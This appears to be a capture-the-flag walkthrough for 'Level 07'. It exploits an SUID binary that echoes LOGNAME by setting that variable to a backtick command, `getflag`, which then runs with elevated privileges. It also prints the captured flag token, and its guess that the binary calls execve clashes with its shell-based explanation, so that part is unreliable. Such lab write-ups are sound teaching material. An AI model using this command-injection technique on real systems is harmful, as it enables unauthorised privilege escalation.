# Level 07 - Environment Variable Exploitation

## Step 1: Examine available files

Let's check what files we have in the home directory:

```sh
ls -l
```

We find an executable with SUID permissions:

```
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Note that this binary is owned by flag07 and has the SUID bit set, meaning it will run with flag07's privileges.

## Step 2: Test the executable

Let's run the program to see what it does:

```sh
./level07
```

Output:
```
level07
```

It seems to be printing the value "level07", which happens to be our username.

## Step 3: Analyze the binary

Let's examine the binary's strings to gain insight into how it works:

```sh
strings level07
```

Among the output, we find these interesting strings:

```
LOGNAME
/bin/echo %s
```

This suggests that the program:
1. Retrieves the environment variable LOGNAME
2. Uses /bin/echo to print its value

The code is likely doing something similar to:

```c
execve("/bin/echo", "echo", getenv("LOGNAME"), NULL);
```

## Step 4: Understand the vulnerability

The program is using the LOGNAME environment variable without validation. Since the program runs with flag07's privileges (due to SUID), we can exploit this by setting LOGNAME to a command we want to execute.

## Step 5: Exploit the vulnerability

Let's modify the LOGNAME environment variable to execute the getflag command:

```sh
export LOGNAME=\`getflag\`
```

The backticks (``) will cause the shell to execute the getflag command and replace it with its output.

When the program runs:
1. It retrieves LOGNAME, which now contains our command
2. It passes this to /bin/echo
3. The shell executes our command with flag07's privileges before passing to echo

## Step 6: Run the exploit

Now we execute the program again:

```sh
./level07
```

## Step 7: Get the flag

The output gives us our flag:

```
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Step 8: Proceed to next level

Now we can advance to level08:

```sh
su level08
Password: fiumuikeil55xe9cu4dood66h
```

